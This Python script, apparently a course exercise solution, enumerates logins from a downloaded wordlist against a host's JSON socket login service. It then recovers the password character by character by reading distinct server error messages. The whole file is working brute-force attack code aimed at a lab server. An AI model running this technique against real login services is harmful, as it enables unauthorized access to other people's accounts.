import socket
import string
import sys
from itertools import product
import requests
import os
import json

class PasswordGenerator:
    def __init__(self, charset='abcdefghijklmnopqrstuvwxyz1234567890'):
        self.charset = charset
        self.length = 1

    def generate(self):
        while True:
          with open('data/logins.txt', 'r') as login_file:
              for login in login_file.read().splitlines():
                  yield login

    @staticmethod
    def get_logins():
        directory = 'data'
        filename = 'logins.txt'
        file_path  = os.path.join(directory, filename)
        url = 'https://cogniterra.org/media/attachments/lesson/24447/logins.txt'

        if os.path.exists(file_path):
            return
        else:
            response = requests.get(url)
            with open(file_path, 'wb') as file:
                file.write(response.content)
            print('File downloaded successfully.')

    @staticmethod
    def download_file():
        directory = 'data'
        filename = 'passwords.txt'
        file_path  = os.path.join(directory, filename)
        url = 'https://cogniterra.org/media/attachments/lesson/24447/passwords.txt'

        if os.path.exists(file_path):
            # print('File already exists.')
            return
        else:
            response = requests.get(url)
            with open(file_path, 'wb') as file:
                file.write(response.content)
            print('File downloaded successfully.')


class PasswordCracker:
    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = port
        self.client_socket = None
        self.generator = PasswordGenerator()

    def connect(self):
        self.client_socket = socket.socket()
        self.client_socket.connect((self.hostname, self.port))

    def try_password(self, data):
        data = json.dumps(data).encode()
        self.client_socket.send(data)
        response = self.client_socket.recv(1024).decode()
        response = json.loads(response)
        return response

    def crack(self):
        try:
            self.connect()
            charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

            # Step 1: Find correct login
            correct_login = None
            for login in self.generator.generate():
                response = self.try_password({'login': login, 'password': ''})
                if response.get("result") == "Wrong password!":
                    correct_login = login
                    # print(f"Valid login found: {correct_login}")
                    break

            # Step 2: Brute-force password character by character
            if correct_login:
                password = ''
                while True:
                    for char in charset:
                        attempt = password + char
                        response = self.try_password({'login': correct_login, 'password': attempt})
                        result = response.get("result")

                        if result == "Connection success!":
                            print(json.dumps({'login': correct_login, 'password': attempt}))
                            sys.exit()

                        if result == "Exception happened during login":
                            password += char
                            break  # try next character

        finally:
            if self.client_socket:
                self.client_socket.close()


class Application:
    @staticmethod
    def run():
        try:
            if len(sys.argv) != 3:
                print('Usage: python hack.py <hostname> <port>')
                return

            hostname = sys.argv[1]
            port = int(sys.argv[2])

            cracker = PasswordCracker(hostname, port)
            password = cracker.crack()

            if password:
                print(password)
                cracker.client_socket.close()
            else:
                print('Password not found')

        except ValueError:
            print('Port must be a valid integer.')
        except ConnectionRefusedError:
            print('Connection refused. Check that the server is running.')
        except Exception as e:
            print(f'An error occurred: {e}')

if __name__ == '__main__':
    PasswordGenerator.get_logins()
    PasswordGenerator.download_file()
    Application.run()